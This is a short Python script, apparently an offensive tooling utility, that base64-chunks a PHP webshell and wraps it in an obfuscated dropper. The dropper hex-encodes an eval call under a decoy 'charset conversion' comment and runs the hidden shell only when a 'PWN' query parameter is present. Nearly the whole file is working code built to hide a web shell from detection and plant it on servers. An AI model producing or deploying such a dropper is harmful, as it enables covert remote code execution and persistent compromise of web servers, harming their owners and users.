import base64



def generate_encoded_webshell(infile):
    # scaffolding is:
        # '[b64 string chunk of len 88]' ,

    final_webshell = ""
    chunk_length = 88

    data = open(infile, "r").read().encode('ascii')
    encoded_string = base64.b64encode(data).decode('ascii')
    
    encoded_webshell = [encoded_string[i:i+chunk_length] for i in range (0, len(encoded_string), chunk_length)]

    for item in encoded_webshell:
        final_webshell += f"\t\'{item}\' ,\n"
    
    return final_webshell

def generate_dropper_stub(encoded_webshell: list):

    code = "$content = base64_decode(join(\"\", $register_key)); eval(\"?>$content\");" 
    
    hex_encoder = "".join([hex(ord(c)).replace("0x","\\x") for c in code])

    decoder_writer = f"""
            
            /**
            * Language and charset conversion settings
            */
            eval("{hex_encoder}");

    """
    
    obfuscated_framework = f"""
<?php

    if (isset($_GET["PWN"])) {{

    define('VERSION', 'Project');

    $register_key = array
    ( 
        {encoded_webshell}
    );
    
    {decoder_writer}

    /*Ending*/
    }}
?>
"""

    print(obfuscated_framework)


def main():
    encoded_webshell = generate_encoded_webshell("webshell-unobfusc.php")
    generate_dropper_stub(encoded_webshell)

if __name__ == "__main__":
    main()



